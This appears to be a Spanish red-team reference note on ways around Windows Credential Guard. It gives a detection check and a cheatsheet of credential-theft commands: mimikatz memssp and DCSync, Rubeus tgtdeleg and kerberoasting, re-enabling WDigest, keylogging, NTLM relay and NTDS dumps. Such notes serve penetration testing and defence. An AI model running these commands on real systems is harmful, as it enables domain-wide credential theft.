---
aliases:
  - Credential Guard Bypass
  - CredGuard Bypass
  - Bypass de Credential Guard
tags:
  - technique/credential-access
  - technique/defense-evasion
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[AD - Security Controls Enumeration]]"
  - "[[Mimikatz Cheatsheet]]"
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
---
# Credential Guard Bypass

**Windows Defender Credential Guard** usa virtualization-based security (VBS) para aislar los secretos de LSASS (hashes NTLM, tickets Kerberos TGT, credenciales WDigest) en un proceso protegido por el hypervisor (LSAIso). Resultado: **dumpear LSASS ya no devuelve credenciales en texto plano ni hashes reutilizables** — mimikatz `sekurlsa::logonpasswords` viene vacío.

No se "rompe" el aislamiento VBS desde userland. La estrategia es **rodearlo**: capturar credenciales *antes* de que entren al enclave, o abusar de material que CredGuard no protege.

---

## Detección

```powershell
# ¿Está activo? (LsaCfgFlags: 1=con UEFI lock, 2=sin lock)
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | select SecurityServicesRunning
# SecurityServicesRunning contiene 1 → Credential Guard corriendo
```

Census defensivo completo: [[AD - Security Controls Enumeration]].

---

## Cheatsheet

| **Técnica / Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-Process lsass; mimikatz # sekurlsa::logonpasswords` | (Vacío con CredGuard) — confirma que el dump clásico no sirve | Verificación inicial. |
| **Keylogger / clipboard** (`Get-Keystrokes`, hooks) | Credenciales en texto plano al tipearlas el usuario | CredGuard no protege el input del teclado. |
| **Custom SSP** (`mimikatz # misc::memssp`) o `AddSecurityPackage` | DLL SSP que loguea cada autenticación en claro a disco | Persistencia + captura post-login. Requiere admin/SYSTEM. |
| **Clave de sesión Kerberos en uso** (`sekurlsa::ekeys` falla → usar `kerberos::list /export`) | TGTs/TGS *cacheados en el proceso del usuario* (no en LSAIso) | Pass-the-Ticket con tickets vivos → [[Pass-the-Ticket]]. |
| `Rubeus.exe tgtdeleg` | TGT del usuario actual vía truco de delegación (sin tocar LSAIso) | Obtener TGT reutilizable aunque CredGuard esté ON. |
| `Rubeus.exe asktgt /user:U /rc4:HASH` (con hash previo) | TGT nuevo a partir de un hash ya conocido | Si conseguiste el hash por otra vía (DCSync, etc.). |
| **Roastear** (`Rubeus kerberoast` / `asreproast`) | Hashes de servicio/usuario crackeables offline | CredGuard no protege contra Kerberoasting → [[Kerberoasting]]. |
| **DCSync** (`mimikatz # lsadump::dcsync /user:krbtgt`) | Hashes del dominio desde el DC (con privilegios) | El DC no usa CredGuard para su propia DB → camino preferido. |
| **Downgrade / forzar WDigest** (`reg add ...\WDigest /v UseLogonCredential /t REG_DWORD /d 1`) + esperar re-login | Credenciales en texto plano en próximos logins | CredGuard bloquea WDigest, pero verificar misconfig en hosts legacy. |
| **Capturar NTLM por red** (Responder + relay) | Hashes Net-NTLMv2 sin tocar el host protegido | CredGuard no afecta autenticación de red → [[NTLM Relay]]. |
| **Shadow snapshot del NTDS** (`vssadmin` / `ntdsutil`) en el DC | Todos los hashes del dominio | Acceso al DC; evita LSASS por completo. |

---

## Overview

Credential Guard **no es un muro absoluto** — protege un conjunto específico de secretos *en reposo en LSASS de un host*. No protege:

- **Lo que el usuario tipea** (keyloggers, fake prompts).
- **La autenticación de red** (NTLM relay, capturas Responder).
- **Material Kerberos cacheado en el proceso del usuario** (tickets para PtT).
- **La base de datos del DC** (DCSync, NTDS dump) — el DC es la fuente real.
- **Hashes crackeables offline** (Kerberoasting / AS-REP roasting).

> [!tip] Regla práctica
> Si ves Credential Guard activo, **dejá de pelear con LSASS**. Pivotá a: TGT del usuario (Rubeus `tgtdeleg`/PtT), roasting, relay de red, o ir directo al DC (DCSync). El objetivo casi nunca necesita el dump local.

> [!warning] Requiere contexto elevado
> Custom SSP, downgrade de WDigest y shadow snapshots requieren admin local / SYSTEM. Keylogging y roasting funcionan con un usuario de dominio común.

---

## Recursos

- [The Hacker Recipes — Credential Guard](https://www.thehacker.recipes/ad/movement/credentials/dumping/) — bypass y dumping.
- [Microsoft — How Credential Guard works](https://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard-how-it-works) — qué protege y qué no.
- [Rubeus](https://github.com/GhostPack/Rubeus) — `tgtdeleg`, `asktgt`, roasting.